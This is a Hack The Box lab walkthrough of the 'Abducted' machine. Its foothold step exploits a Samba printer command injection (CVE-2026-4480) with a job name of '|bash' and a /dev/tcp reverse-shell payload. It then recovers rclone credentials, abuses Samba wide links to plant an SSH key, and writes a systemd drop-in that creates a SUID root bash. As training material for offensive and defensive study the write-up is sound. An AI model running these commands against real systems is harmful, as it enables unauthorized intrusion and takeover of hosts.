> HTML Page: [[HTML Pages/HTB/HTB Abducted.html|Open HTML Page]]

### Recon

#### Initial Scanning

The full-port nmap sweep identifies three open TCP ports: SSH (22), NetBIOS (139), and SMB (445). All three return a TTL of 63, confirming a Linux host one hop away. The version scan reports Samba 4.6.2, but this should be treated skeptically — SMB2/SMB3 do not send the same version banner as legacy SMB1, and SMB1 is disabled here. Samba 4.6.2 dates from 2017 and would be anomalous on Ubuntu 24.04 LTS, which ships with approximately 4.19.x. The reported version is a known artefact of nmap's fingerprinting against SMB1 banners it cannot actually read. Always cross-check software versions with OS context:

bash

```bash
sudo nmap -p- --reason --min-rate 10000 10.129.244.177
sudo nmap -p 22,139,445 -sCV 10.129.244.177
```

The SMB script results note that "Message signing enabled but not required" — relevant for relay attack planning in real engagements but not directly exploited here. The NetBIOS name is `ABDUCTED` and the workgroup is the default `WORKGROUP`, confirming no Active Directory domain is in play.

#### NetBIOS Enumeration — TCP 139

`nmblookup` provides a complete picture of the host's NetBIOS name table, which is worth reading carefully rather than skipping:

bash

```bash
nmblookup -A 10.129.244.177
```

The suffix bytes in the output are meaningful and worth memorizing for real engagements. `<00>` (unique) is the Workstation Service — the machine's primary NetBIOS name. `<03>` (unique) is the Messenger Service. `<20>` (unique) is the File Server Service, and its presence confirms that file shares exist to enumerate — without this, there may be no disk shares despite SMB being open. `<01>` group (`__MSBROWSE__`) means the host is advertising itself as the master browser for the subnet. `WORKGROUP <00>` group confirms plain workgroup membership (no domain). `WORKGROUP <1d>` (unique) designates the host as the master browser for the workgroup. `WORKGROUP <1e>` (group) is the Browser Election Service. The all-zero MAC address is a normal Samba-on-Linux artefact since Samba doesn't tie itself to a real interface for NetBIOS.

#### SMB Share Enumeration — TCP 445

`netexec` confirms the Samba hostname and identifies that both Null Auth and Guest Auth are advertised as enabled, but it fails to enumerate shares when attempting to use them — returning `STATUS_ACCESS_DENIED` even for the guest account. This is a known `netexec` compatibility quirk with certain Samba configurations; the tool can authenticate but then fails at the share-listing step:

bash

```bash
netexec smb 10.129.244.177
netexec smb 10.129.244.177 --shares
netexec smb 10.129.244.177 -u guest -p '' --shares
```

`smbclient` has no such problem and lists shares cleanly using the null-session (`-N`) flag:

bash

```bash
smbclient -L //10.129.244.177/ -N
```

Four shares are returned: `HP-Reception` (a Printer share), `projects` (Disk, "Hartley Group Project Files"), `transfer` (Disk, "Staff file transfer"), and `IPC$`. Both disk shares reject unauthenticated access with `NT_STATUS_ACCESS_DENIED`, but the `HP-Reception` printer share accepts the null session and allows `smbclient` to connect. The printer share has nothing to list (it's a spool, not a disk), but the `print` command is available, which is the entry point for the foothold exploit.

#### RPC Enumeration — TCP 445

`rpcclient` with a null session yields valuable reconnaissance. User enumeration via `enumdomusers` and `querydispinfo` reveals a single domain user — `scott` (Scott Mercer, RID 0x3e8). The minimum password length policy is 5 characters. `netshareenumall` confirms the share paths: `HP-Reception` maps to `/var/spool/samba`, `projects` to `/srv/projects`, and `transfer` to `/srv/transfer`. `enumprinters` confirms one printer registered at `\\10.129.244.177\`:

bash

```bash
rpcclient -N 10.129.244.177 -U ""
rpcclient $> enumdomusers
rpcclient $> querydispinfo
rpcclient $> getdompwinfo
rpcclient $> netshareenumall
rpcclient $> enumprinters
rpcclient $> srvinfo
```

The `srvinfo` output shows OS version 6.1 (which would be Windows 7 / Server 2008 R2 in a real Windows context) — this is a hardcoded fake banner that Samba returns and should not be taken literally.

---

### Foothold: Shell as nobody via CVE-2026-4480

#### Background and Vulnerability Analysis

Abducted was released directly to retired in June 2026, which is a strong signal that the box was purpose-built around a newly published CVE. Searching "samba cve 2026" surfaces CVE-2026-4480, a critical CVSS 10.0 OS command injection in Samba's printing subsystem.

The vulnerability description is precise and important: Samba passes the client-controlled job description string to the command configured under the `print command` setting via the `%J` substitution character **without escaping shell metacharacters**. The only sanitization applied is swapping single quotes for underscores, which is entirely insufficient. Any other shell metacharacter — pipes, backticks, dollar-sign expansions, semicolons — passes through unmodified into the shell that executes the `print command`. An unauthenticated remote attacker who can reach a printer share can therefore achieve remote code execution by crafting a print job whose description is itself a shell command or pipeline.

In the Abducted config (`/etc/samba/shares.conf`), the HP-Reception printer share is configured with:

```
print command = /usr/local/bin/printaudit %J %s
```

When `%J` expands to a value like `|sh`, the resulting shell command becomes:

```
/usr/local/bin/printaudit |sh <spoolfile>
```

which the shell reads as: run `printaudit`, pipe its output into `sh`, with `<spoolfile>` as input — but since `sh` is now reading from the pipe, and the spool file contains attacker-controlled content, arbitrary commands from the spool file execute under the user context of the Samba print daemon (`nobody` in this configuration).

#### Manual Exploitation

The manual exploit requires two steps: create a local file whose name is the shell injection string, and then print that file using `smbclient`. The filename becomes the job name (`%J`) and the file's contents become the spool body (`%s`) that will be executed. For a ping-back POC:

bash

```bash
echo 'ping -c 1 10.10.15.243' > '|sh'
smbclient //10.129.244.177/HP-Reception -N -c 'print "|sh"'
```

Verify execution by catching the ICMP packet on the attacker:

bash

```bash
sudo tcpdump -ni tun0 icmp
```

For a reverse shell, the spool file content changes and the filename changes to `|bash` to run the shell script under bash rather than POSIX sh (more portable for the interactive reverse shell):

bash

```bash
echo 'bash -i >& /dev/tcp/10.10.15.243/443 0>&1' > '|bash'
smbclient //10.129.244.177/HP-Reception -N -c 'print "|bash"'
nc -lnvp 443
```

The shell arrives as `nobody@abducted` in `/var/spool/samba`, which is the Samba print spool directory. This is where the connection between the spool body and the injection chain physically lives.

#### Box Creator's Python POC

TheCyberGeek released a Python POC on GitHub (same day as the box release) that replicates the manual steps programmatically using Samba's own Python bindings (`impacket`-style). The key logic sets `info.document_name = "|sh"` (the `%J` injection point) and writes the reverse shell payload as the body passed to `WritePrinter` (`%s`, the spool file content). `EndDocPrinter` is what triggers the server-side `print command` execution. The POC requires system-level Samba Python packages, so running it with the system `python3` (rather than a virtual environment) avoids package resolution complications:

bash

```bash
python3 exploit.py 10.129.244.177 10.10.15.243 445
```

#### PTY Upgrade

After catching the raw reverse shell, always upgrade to a full PTY before proceeding with enumeration:

bash

```bash
nobody@abducted:/var/spool/samba$ script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
# Type 'screen' at the Terminal type? prompt
```

---

### Lateral Movement 1: nobody → scott via rclone Credential Disclosure

#### Filesystem Enumeration as nobody

As `nobody`, the home directory doesn't exist at all (`/nonexistent` in `/etc/passwd`, with shell `/usr/sbin/nologin`). Standard privilege enumeration reveals two real users with home directories — `scott` (UID 1000) and `marcus` (UID 1001) — neither of which is accessible to `nobody`. The `/srv` directory holds two subdirectories (`projects` and `transfer`) matching the SMB share paths, also inaccessible.

The high-value finding is in `/opt/offsite-backup`:

bash

```bash
nobody@abducted:/opt/offsite-backup$ ls
rclone.conf  sync.sh
```

The `sync.sh` script is a simple rclone sync wrapper:

bash

```bash
#!/bin/bash
/usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects
```

The `rclone.conf` file is world-readable and contains SFTP credentials for an off-site backup target:

ini

```ini
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

#### rclone Password Decoding

This is a critical security lesson: **rclone's password obfuscation is not encryption**. rclone stores passwords in its config files using a reversible encoding scheme that it applies to prevent casual shoulder-surfing, but it is explicitly not a security measure. Any user who can read the config file can trivially recover the plaintext with a single command using rclone itself:

bash

```bash
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
# Returns: iXzvcib3SrpZ
```

The `rclone reveal` subcommand is a built-in utility specifically for this purpose. In real environments, rclone config files containing SFTP or cloud storage credentials should be treated with the same access controls as private SSH keys or plaintext passwords — `rclone reveal` makes the obfuscated form trivially reversible. In defensive contexts, searching for world-readable `rclone.conf` files during audits is always worth doing.

#### Credential Reuse and SSH

Password reuse testing against both known users reveals that `iXzvcib3SrpZ` (recovered from the rclone config, originally meant for `svc-backup` on an external SFTP server) also authenticates as `scott` locally — neither via `su - marcus` (which fails) nor the `svc-backup` user, but against the local `scott` account:

bash

```bash
nobody@abducted:/$ su - marcus
# Password: iXzvcib3SrpZ — Authentication failure

nobody@abducted:/$ su - scott
# Password: iXzvcib3SrpZ — Success
```

SSH also works directly:

bash

```bash
sshpass -p iXzvcib3SrpZ ssh scott@10.129.244.177
```

The credential reuse pattern here is subtle and realistic: the backup service credential is shared with the system account of the person responsible for the backup workflow, which is a common real-world shortcut that creates a lateral movement path from any readable config file.

---

### Lateral Movement 2: scott → marcus via Samba Wide Link Abuse

#### Share Configuration Analysis

As `scott`, the full Samba configuration becomes readable. `/etc/samba/smb.conf` (global) and `/etc/samba/shares.conf` (per-share) together define the attack surface:

**Global settings of interest (`smb.conf`):**

ini

```ini
[global]
   unix extensions = no
   allow insecure wide links = yes
```

**Share-level settings of interest (`shares.conf`):**

ini

```ini
[transfer]
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

Three settings on the `transfer` share combine to create the privilege escalation path:

1. **`valid users = scott`** — only scott can authenticate to this share over SMB. This is how scott gains access to the underlying share directory even though the files inside will be read/written as a different user.
2. **`force user = marcus`** — every file operation on this share, regardless of which authenticated user performed it, executes as `marcus` at the OS level. When scott reads or writes through this share, the kernel sees those operations as coming from `marcus`.
3. **`wide links = yes`** — the Samba server will follow symbolic links that point outside the share's configured `path`. Normally, Samba restricts followed symlinks to remain within the share root to prevent directory traversal outside the intended export. With `wide links = yes`, symlinks pointing anywhere on the filesystem are followed.

**Why `unix extensions = no` matters here:** Samba normally disables `wide links` automatically when `unix extensions = yes` is set, because UNIX extensions allow clients to create symlinks over the SMB protocol itself, which would make wide-link following trivially exploitable. The global `unix extensions = no` disables that client-side symlink capability, and `allow insecure wide links = yes` re-enables wide link following anyway. The box author deliberately configured this combination, which is explicitly flagged in the Samba documentation as a security hole.

#### Exploitation: SSH Key Injection via Wide Link

The attack is straightforward: create a symlink inside the `transfer` share directory that points to marcus's home directory. When this symlink is followed over SMB (with `force user = marcus`), the OS reads/writes to `/home/marcus` with marcus's effective UID, bypassing the directory's actual permission bits that would otherwise deny scott read/write access:

On the server as scott (the symlink itself must be created at the OS level, which scott can do since he owns `/srv/transfer`):

bash

```bash
scott@abducted:/srv/transfer$ ln -s /home/marcus
scott@abducted:/srv/transfer$ ls -l
# lrwxrwxrwx 1 scott scott 12 Jul  6 00:53 marcus -> /home/marcus
```

Attempting to follow the link directly from the OS session as scott fails correctly — scott doesn't have OS-level access to `/home/marcus`:

bash

```bash
scott@abducted:/srv/transfer$ cd marcus
# -bash: cd: marcus: Permission denied
```

But through the SMB share, the `force user = marcus` directive means the kernel evaluates the path traversal as marcus, and the wide link is followed:

bash

```bash
smbclient //10.129.244.177/transfer -U scott%iXzvcib3SrpZ
smb: \> ls
# Shows: marcus -> /home/marcus

smb: \> cd marcus
smb: \marcus\> ls
# Lists .profile, .bashrc, .bash_history, .cache — marcus's home directory

smb: \marcus\> mkdir .ssh
smb: \marcus\> put /home/oxdf/keys/ed25519_gen.pub .ssh/authorized_keys
# Uploads attacker's public key as marcus's authorized_keys
```

Verify the key was placed:

bash

```bash
smb: \marcus\.ssh\> ls
# authorized_keys  96 bytes
```

Connect via SSH with the matching private key:

bash

```bash
ssh -i ~/keys/ed25519_gen marcus@10.129.244.177
```

This is an elegant attack: no password cracking, no brute force, no vulnerability in the traditional sense — just a deliberate but dangerous combination of Samba configuration directives that, together, allow one authenticated user to read and write another user's home directory through the file server.

---

### Privilege Escalation: marcus → root via systemd Drop-in + polkit

#### Group Membership Discovery

The first thing to check with a new user context is group membership beyond the primary group:

bash

```bash
marcus@abducted:~$ id
# uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

Marcus belongs to the `operators` group in addition to his primary group. Finding what this group can access is the next priority:

bash

```bash
marcus@abducted:~$ find / -group operators 2>/dev/null | grep -vP '^/(proc|sys|run)'
```

This returns one highly interesting result:

bash

```bash
/etc/systemd/system/smbd.service.d/
```

bash

```bash
marcus@abducted:~$ ls -ld /etc/systemd/system/smbd.service.d/
# drwxrws--- 2 root operators 4096 Jun  4 13:41 /etc/systemd/system/smbd.service.d/
```

The `s` in the group-execute bit position indicates the **setgid bit** is set on the directory, which means any file created inside this directory will inherit the `operators` group, not the creating user's primary group. The directory is writable by the `operators` group, meaning marcus can create files here. The directory is a **systemd drop-in directory** for the `smbd` service.

#### Understanding systemd Drop-in Directories

Systemd drop-in directories are a core systemd concept worth understanding deeply. When systemd loads a service unit file (e.g., `/lib/systemd/system/smbd.service`), it also checks for a directory named `<service>.d` in each of its unit search paths (typically `/etc/systemd/system/`, `/usr/lib/systemd/system/`, etc.). Any `.conf` files found inside that directory are parsed and their directives are merged into the main unit's configuration, overriding or appending to the base configuration. This is the standard mechanism for customizing distribution-provided service units without modifying files managed by the package manager.

For privilege escalation, the implication is: **any `.conf` file placed in `/etc/systemd/system/smbd.service.d/` will be loaded as part of the `smbd` service configuration the next time the daemon reloads and the service restarts**. This allows injecting arbitrary systemd service directives — including execution hooks — that run in the service's privilege context (which, for `smbd` running with root-owned files, is effectively root).

#### Confirming Service Restart Capability via polkit

The immediate question is: can marcus actually reload the systemd daemon and restart `smbd`? Testing directly confirms it works without prompting for a password:

bash

```bash
marcus@abducted:~$ systemctl daemon-reload
# Returns without output — success

marcus@abducted:~$ systemctl restart smbd
# Returns without output — success
```

Restarting a different service (e.g., `sshd`) prompts for the root password, confirming that the free access is specific to `smbd` and `daemon-reload`. This behavior is controlled by polkit. Auditing polkit's registered actions and checking authorization:

bash

```bash
marcus@abducted:~$ pkaction | grep systemd
# Lists all systemd-related polkit actions

marcus@abducted:~$ pkaction --action-id org.freedesktop.systemd1.reload-daemon --verbose
# Shows: implicit any: auth_admin / implicit inactive: auth_admin / implicit active: auth_admin_keep

marcus@abducted:~$ pkcheck --action-id org.freedesktop.systemd1.reload-daemon --process $$ && echo "success"
# Prints: success
```

The `pkcheck` command tests whether the calling process (by PID `$$` — the current shell) is authorized for the specified polkit action. A zero exit code means authorized. Despite `pkaction` showing `auth_admin` as the implicit policy (which should require root-level authentication), the check succeeds because a custom polkit rule overrides the default.

The polkit rules directory (`/etc/polkit-1/rules.d/`) is not readable as marcus, but `pkcheck` tells the truth without needing to read the rules file directly. As root, the rule file is revealed (`49-smbd-operators.rules`):

javascript

```javascript
polkit.addRule(function(action, subject) {
    if (!subject.isInGroup("operators")) { return; }
    if (action.id == "org.freedesktop.systemd1.reload-daemon") {
        return polkit.Result.YES;
    }
    if ((action.id == "org.freedesktop.systemd1.manage-units" ||
         action.id == "org.freedesktop.systemd1.manage-unit-files") &&
        action.lookup("unit") == "smbd.service") {
        return polkit.Result.YES;
    }
});
```

The rule grants the `operators` group unconditional access to `reload-daemon` and to `manage-units`/`manage-unit-files` — but _only_ when the target unit is `smbd.service`. This is a well-intentioned fine-grained policy that nonetheless creates a complete privilege escalation path when combined with write access to the drop-in directory for that same service.

An important operational note: using `pkcheck` to confirm authorization for `manage-units` with a detail parameter fails from a non-privileged context because polkit won't let unprivileged callers attach `action.lookup()` detail parameters in a `CheckAuthorization()` call — only root or the action owner (systemd itself) can do that. This means you can't use `pkcheck` directly to enumerate per-unit grants from a user session. The behavioral test (`systemctl restart smbd` succeeding) is the correct empirical check.

#### Exploitation: ExecStartPre SUID Bash Injection

The `ExecStartPre` systemd directive specifies commands to run before the main `ExecStart` command when the service starts. It runs in the service's privilege context — since `smbd` starts as root, `ExecStartPre` commands run as root. The `-` prefix on a command tells systemd to ignore failure for that command and continue starting the service, which is important here so that adding the drop-in doesn't break the `smbd` service.

Write the malicious drop-in configuration into the writable directory:

bash

```bash
marcus@abducted:/etc/systemd/system/smbd.service.d$ echo -e '[Service]\nExecStartPre=-/bin/bash -c "cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf"' | tee 0xdf.conf
```

This writes a two-line config:

ini

```ini
[Service]
ExecStartPre=-/bin/bash -c "cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf"
```

The `chmod 6777` sets both the SUID and SGID bits plus full rwx permissions — running `/tmp/0xdf -p` will spawn a bash process that retains the effective UID of the file owner (root), even when invoked by an unprivileged user.

Reload the systemd daemon and restart the service:

bash

```bash
marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl daemon-reload
marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl restart smbd
```

Verify the SUID binary was created:

bash

```bash
marcus@abducted:/etc/systemd/system/smbd.service.d$ ls -l /tmp/0xdf
# -rwsrwsrwx 1 root root 1446024 Jul  6 12:55 /tmp/0xdf
```

Invoke it with `-p` to prevent bash from dropping the elevated effective UID:

bash

```bash
marcus@abducted:/etc/systemd/system/smbd.service.d$ /tmp/0xdf -p
0xdf-5.2#
```

Root shell obtained. The `0xdf-5.2#` prompt style confirms this is bash running with effective root privileges.

---

### Key Lessons for the Analyst

**nmap's Samba version fingerprint is frequently wrong on modern targets.** nmap determines the Samba version from the SMB1 negotiation banner. When SMB1 is disabled (which is the security-correct configuration on any modern Samba deployment), nmap falls back to stale pattern matching and often reports versions like 4.6.2 that are years out of date. Always contextualise reported Samba versions against the underlying OS version and treat the nmap output as a lower bound at best. For accurate Samba version identification, reading the binary directly (`strings /usr/sbin/smbd | grep -i "version"`) is more reliable when you have a foothold.

**`smbclient` and `netexec` behave differently against guest-enabled Samba — test both.** `netexec` returned `STATUS_ACCESS_DENIED` during share enumeration despite the guest account being valid, while `smbclient -L` with `-N` succeeded immediately. This is not a credentials problem but a protocol-level difference in how each tool implements the guest session. In real engagements, tool failure at one step should always trigger a retry with an alternative — `smbclient`, `smbmap`, `crackmapexec`, and `netexec` can all behave differently against the same target.

**NetBIOS suffix bytes are a fast, passive reconnaissance source.** The `<20>` suffix on a unique name record (`HOSTNAME <20>`) confirms File Server Service is running and shares exist without any active SMB probing. The presence or absence of `<1d>` (Master Browser) and the workgroup name give immediate domain/workgroup context. `nmblookup -A <ip>` should be a standard recon step against any host exposing TCP 139/445.

**rclone's `pass` field is reversible obfuscation, not encryption.** The `rclone reveal` command is a documented, first-party feature for reading back stored passwords. Any rclone.conf file that is world-readable is equivalent to a plaintext credentials file. During blue-team audits, check the permissions on `/opt`, `/home`, and `/etc` for rclone.conf files. During red-team operations, any rclone.conf found during enumeration should be immediately decoded — the pattern `rclone reveal <encoded_value>` is all that's required, and it works even without network access to the configured remote.

**Samba's `wide links` + `force user` combination is a deliberate but dangerous design.** The `wide links = yes` directive instructs Samba to follow symlinks that point outside the configured share path. On its own this is already a significant misconfiguration, but when combined with `force user = <another_user>`, the effective privilege of the followed path becomes that of the forced user — meaning one authenticated user can read and write another user's files anywhere on the filesystem by creating a symlink pointing to the target directory. The Samba project itself documents this as a security hole and sets `allow insecure wide links = no` as the default. Both directives appearing together in a production configuration should be treated as an immediate critical finding.

**polkit rules require behavioral testing, not just static analysis.** The polkit rules directory (`/etc/polkit-1/rules.d/`) is typically readable only by root, and `pkcheck` cannot evaluate per-unit `action.lookup()` conditions from unprivileged contexts. The correct workflow is: enumerate group memberships, find writable service-related paths, then empirically test with `systemctl` whether those operations succeed without a password prompt. Successful silent execution is the confirmation, not a successful `pkcheck` query.

**`ExecStartPre=-` with a SUID-creating payload is a clean systemd privilege escalation primitive.** Any scenario where an unprivileged user can write to a `<service>.d` drop-in directory AND restart that service (whether through polkit, `sudo`, or any other mechanism) is a complete privilege escalation path. The `-` prefix on the directive suppresses failure, ensuring the service starts cleanly and the malicious command doesn't produce visible service disruption. The SUID bash copy (`cp /bin/bash /tmp/<name>; chmod 6777 /tmp/<name>`) combined with `/tmp/<name> -p` is the standard payload because it persists across the shell invocation and requires no network callback. In detection engineering, monitoring for `chmod 6777` or `chmod +s` in `ExecStartPre`/`ExecStartPost` directives added to drop-in directories is a valuable defensive signal.

---

### Tools & Cheat Sheet

|Tool|Purpose in this box|Key command / flag|
|---|---|---|
|`nmap`|Full-port scan and service/version detection; OS fingerprint from SSH banner; SMB signing status|`nmap -p- --reason --min-rate 10000 <ip>` then `nmap -p 22,139,445 -sCV <ip>`|
|`nmblookup`|NetBIOS name table query; identifies File Server Service (`<20>`) and workgroup/domain membership|`nmblookup -A <ip>`|
|`netexec`|SMB host fingerprinting; guest/null auth detection; share enumeration (fallible — cross-check with smbclient)|`netexec smb <ip>` / `netexec smb <ip> -u guest -p '' --shares`|
|`smbclient`|Share listing (null session); printer share access; `print` command for CVE-2026-4480 exploitation; SSH key upload via SMB for wide link abuse|`smbclient -L //<ip>/ -N` / `smbclient //<ip>/HP-Reception -N -c 'print "\|bash"'` / `smbclient //<ip>/transfer -U scott%<pass>`|
|`rpcclient`|Anonymous RPC enumeration; user listing, share paths, printer enumeration, domain password policy|`rpcclient -N <ip> -U ""` → `enumdomusers`, `netshareenumall`, `enumprinters`, `srvinfo`|
|`rclone reveal`|Decode rclone's obfuscated password field from `rclone.conf` — not encryption, trivially reversible|`rclone reveal <encoded_string>`|
|`sshpass`|Non-interactive SSH/SCP using a password|`sshpass -p <pass> ssh <user>@<ip>`|
|`ssh -i`|SSH using a private key; used after planting authorized_keys via SMB wide link abuse|`ssh -i ~/keys/ed25519_gen marcus@<ip>`|
|`id`|Group membership check; reveals supplementary groups like `operators` that drive the final escalation|`id`|
|`find`|File/directory ownership search filtered by group; locate drop-in directories writable by supplementary group|`find / -group operators 2>/dev/null \| grep -vP '^/(proc\|sys\|run)'`|
|`pkaction`|List all polkit action IDs registered on the system; `--verbose` shows per-action default policies|`pkaction` / `pkaction --action-id <action-id> --verbose`|
|`pkcheck`|Test whether the current process is authorized for a polkit action; confirms service restart capability|`pkcheck --action-id org.freedesktop.systemd1.reload-daemon --process $$ && echo "success"`|
|`systemctl`|Reload daemon and restart smbd after writing the malicious drop-in; confirms polkit-granted access|`systemctl daemon-reload` / `systemctl restart smbd`|
|`ln -s`|Create symlink in SMB share directory pointing to target user's home; prerequisite for wide link abuse|`ln -s /home/marcus` (run inside `/srv/transfer`)|
|`nc`|Catch reverse shell from CVE-2026-4480 print job execution|`nc -lnvp 443`|
|`script` / `stty` PTY trick|Upgrade raw reverse shell to full interactive PTY|`script /dev/null -c bash` → Ctrl+Z → `stty raw -echo; fg` → type `screen`|
|`tee`|Write systemd drop-in config file while also displaying output for verification|`echo -e '[Service]\nExecStartPre=...' \| tee 0xdf.conf`|
|`/tmp/0xdf -p`|Run SUID bash copy with privilege preservation flag; `-p` prevents bash from dropping effective root UID|`/tmp/0xdf -p`|